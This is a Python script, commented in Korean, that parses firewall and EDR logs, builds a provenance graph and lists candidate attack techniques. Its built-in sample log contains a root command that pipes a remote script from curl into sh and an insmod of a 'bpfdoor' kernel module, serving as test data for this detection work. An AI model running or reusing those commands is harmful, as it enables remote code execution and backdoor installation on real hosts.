# main.py
# 1) 로그 읽기 -> 2) 그래프 생성 -> 3) TTP 후보 출력

import argparse
from pathlib import Path
import networkx as nx

from behavior_graph import parse_logs, build_provenance_graph
from TTP import extract_ttp_candidates


def read_lines(path: Path) -> list[str]:
    return path.read_text(encoding="utf-8", errors="ignore").splitlines()


def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("--log", type=str, required=False, help="로그 파일 경로")
    parser.add_argument("--default-host", type=str, default="fw01", help="호스트 정보 없을 때 기본값")
    parser.add_argument("--save-gexf", type=str, default="provenance.gexf", help="그래프 저장 파일명")
    args = parser.parse_args()

    # 로그 입력: 파일 없으면 예시 사용
    if args.log:
        lines = read_lines(Path(args.log))
    else:
        lines = [
            "2025-10-01T10:12:34 fw01 kernel: DROP IN=eth1 SRC=10.1.2.45 DST=10.1.2.10 DPT=22",
            "2025-10-01T10:12:34 fw01 kernel: DROP IN=eth1 SRC=10.1.2.45 DST=10.1.2.10 DPT=80",
            "2025-10-01T10:15:05 host-edge01 EDR: process_create pid=4421 ppid=4320 user=root cmdline=\"/bin/sh -c curl -s http://10.2.3.10/bin/runme.sh | sh\"",
            "2025-10-01T10:19:58 host-edge01 EDR: process_create pid=4533 ppid=4421 user=root cmdline=\"/usr/bin/insmod /tmp/bpfdoor.ko\"",
            "parent_chain: sshd(120)-bash(4321)-curl(4421)-sh(4530)-insmod(4533)",
        ]

    # 1) 파싱
    events = parse_logs(lines, default_host=args.default_host)

    # 2) 그래프 만들기
    G = build_provenance_graph(events)
    print(f"[Graph] nodes={G.number_of_nodes()} edges={G.number_of_edges()}")

    # 3) TTP 후보 뽑기
    ttps = extract_ttp_candidates(events)
    print("\n[Top TTP candidates]")
    for t in ttps[:10]:
        print(f"- {t['technique_id']} {t['name']} score={t['score']:.2f}")
        for ev in t["evidence"][:2]:
            print(f"  * {ev}")

    # Gephi로 저장
    nx.write_gexf(G, args.save_gexf)
    print(f"\n[Saved] {args.save_gexf}")


if __name__ == "__main__":
    main()
